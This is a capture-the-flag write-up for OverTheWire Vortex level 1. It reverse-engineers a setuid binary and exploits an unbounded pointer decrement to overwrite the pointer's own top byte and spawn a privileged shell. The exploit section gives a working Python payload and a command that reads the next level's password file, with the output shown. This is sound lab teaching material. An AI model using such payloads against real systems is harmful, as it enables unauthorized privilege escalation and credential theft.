# OverTheWire — Vortex Level 1 → 2

> Goal: the `vortex2` password from `vortex1`. Result: **`**********`** (redacted)
> Technique: unbounded `ptr` decrement → make the pointer overwrite **itself** and set its MSB to `0xca` → embedded `execlp` shell.
> Environment: 32-bit x86, stack canary **present** (we don't touch it), NX on (no shellcode needed), **ASLR irrelevant**.

---

## 1. Connection
```bash
ssh vortex1@vortex.labs.overthewire.org -p 2228   # password: obtained from vortex0
```
`/vortex/vortex1` → `-r-sr-x---  vortex2 vortex1` (setuid vortex2). **No source (`.c`)** → disassembled with `objdump -d -M intel` and the logic reconstructed (not stripped, symbols present).

## 2. Analysis (`objdump` → pseudocode)
```c
char buf[512];              // ebp-0x21c
char *ptr = buf + 256;      // ebp-0x224 ; start buf+0x100
int x;
while ((x = getchar()) != EOF) {
    if      (x == '\n') print(buf, 512);            // print buf
    else if (x == '\\') ptr--;                       // ⚠ NO BOUNDS CHECK
    else {
        if ((ptr & 0xff000000) == 0xca000000) {      // WIN condition
            setresuid(geteuid(), geteuid(), geteuid());
            execlp("/bin/sh", "sh", NULL);           // → vortex2 shell
        }
        if (ptr <= buf + 512)                         // only UPPER bound check
            *ptr++ = (char)x;                         // write, then advance
    }
}
puts("All done");
```

## 3. Vulnerability
- `\` (backslash) → does `ptr--`, with **no bounds check at all** → ptr can descend far below `buf`.
- The write only checks the **upper** bound (`ptr <= buf+512`); there is no lower bound → **writing below buf is free**.
- The `ptr` variable itself sits in memory just below `buf` (`ebp-0x224`, while buf is at `ebp-0x21c` → 8 bytes earlier). So we can walk ptr back and make **its own storage** the write target.
- To win: `ptr`'s **most significant byte (MSB)** should be `0xca` → `(ptr & 0xff000000)==0xca000000` → `execlp` shell.

> 💡 **Why ASLR is irrelevant:** ptr is a stack address (possibly random), but we are not trying to know its value — we write **`0xca` directly** into its MSB. Whatever the address is, the top byte becomes 0xca.

## 4. Offset (where 261 comes from)
- `ptr` start = `buf+0x100` = `ebp-0x11c`.
- The MSB of the `ptr` variable (little-endian, highest address) = `ebp-0x224 + 3` = `ebp-0x221`.
- Decrement needed = `0x221 - 0x11c` = **261** backslashes → ptr points exactly at its own MSB.
- Then write `0xca`: `*ptr = 0xca` clobbers the MSB → `ptr = 0xca______`.
- One more trigger byte (any normal char) → the win check passes → shell.

## 5. Exploit
```bash
python3 -c '
import sys,time
sys.stdout.buffer.write(b"\\"*261 + b"\xca\xca"); sys.stdout.flush(); time.sleep(1)
sys.stdout.buffer.write(b"id; cat /etc/vortex_pass/vortex2\n"); sys.stdout.flush(); time.sleep(1)
' | /vortex/vortex1
```
Output:
```
uid=5002(vortex2) gid=5001(vortex1) groups=5001(vortex1)
**********
```
> ⚠️ **stdio/EOF trap (official hint: "how bash handles EOF"):** `getchar` pulls the input into the 4 KB stdio buffer all at once. If you feed the payload together with the commands in one shot, then when the `execlp` shell is born the buffer stays in the old process, the pipe empties → the shell gets an **immediate EOF** and closes. Fix: send the payload, **wait briefly** (let getchar consume it and the shell come up), *then* feed the command — so the command waits in the pipe for the shell.

## Lessons
| Topic | Note |
|------|------|
| Unbounded pointer | `\` → `ptr--`, no bounds check → ptr can land on top of its own storage |
| One-way bound | The write only checks the upper bound (`ptr<=buf+512`); no lower bound |
| Self-modifying write | Bring ptr to its own MSB + write `0xca` → `(ptr&0xff000000)==0xca000000` wins |
| Little-endian | MSB = the highest-addressed byte (`ebp-0x221`); `0xca` is written there ([[vortex0]] byte-order revisited) |
| ASLR-independent | No need to know the address value; the MSB is written directly |
| stdio/EOF trap | `getchar` buffers → wait after the payload, then feed the command (let the spawned shell read it) |
| setuid privesc | `setresuid(geteuid×3)` before `execlp` → ruid=vortex2, the shell doesn't drop privilege |
| When there's no source | `objdump -d -M intel` + `not stripped` symbols → lift the logic into pseudocode |
